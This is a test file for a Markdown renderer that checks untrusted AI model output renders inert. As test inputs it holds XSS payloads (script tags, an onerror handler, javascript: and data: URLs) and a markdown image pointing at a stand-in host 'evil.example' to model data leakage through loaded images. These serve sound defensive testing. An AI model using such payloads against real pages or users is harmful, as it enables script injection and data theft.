import { render } from "@testing-library/react";
import { describe, expect, it } from "vitest";

import { Markdown, safeUrl } from "./Markdown";

/** Untrusted model output must render inert (CR-006 G3, SC8). */
describe("Markdown", () => {
  it("never renders raw HTML, scripts or event handlers", () => {
    const { container } = render(
      <Markdown text={'<script>window.pwned=1</script>\n\nhi <img src=x onerror="window.pwned=1"> <b>bold?</b>\n\n**real bold**'} />,
    );
    expect(container.querySelector("script")).toBeNull();
    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelector("b")).toBeNull();
    expect(container.querySelector("strong")?.textContent).toBe("real bold");
    expect(container.innerHTML).not.toContain("onerror");
  });

  it("never loads an image: it becomes a link to it", () => {
    const { container } = render(<Markdown text={"![secret](https://evil.example/?q=leak) ![x](javascript:alert(1))"} />);
    expect(container.querySelector("img")).toBeNull();
    const links = container.querySelectorAll("a");
    expect(links).toHaveLength(1);
    expect(links[0]?.getAttribute("href")).toBe("https://evil.example/?q=leak");
    expect(container.textContent).toContain("[image: secret]");
  });

  it("keeps only safe links, opened without opener or referrer", () => {
    const { container } = render(<Markdown text={"[ok](https://a.example) [bad](javascript:alert(1)) [data](data:text/html,x) [m](mailto:a@b.c)"} />);
    const hrefs = [...container.querySelectorAll("a")].map((a) => a.getAttribute("href"));
    expect(hrefs).toEqual(["https://a.example", "mailto:a@b.c"]);
    expect(container.querySelector("a")?.getAttribute("rel")).toBe("noopener noreferrer nofollow");
    expect(container.querySelector("a")?.getAttribute("target")).toBe("_blank");
  });

  it("renders the useful parts: lists, code, tables", () => {
    const { container } = render(<Markdown text={"- a\n- b\n\n`x`\n\n```\ncode\n```\n\n| h |\n|---|\n| c |"} />);
    expect(container.querySelectorAll("li")).toHaveLength(2);
    expect(container.querySelector("pre code")?.textContent).toContain("code");
    expect(container.querySelector("td")?.textContent).toBe("c");
  });

  it("safeUrl", () => {
    expect(safeUrl(" https://x.y ")).toBe("https://x.y");
    expect(safeUrl("JAVASCRIPT:alert(1)")).toBeNull();
    expect(safeUrl(undefined)).toBeNull();
  });
});
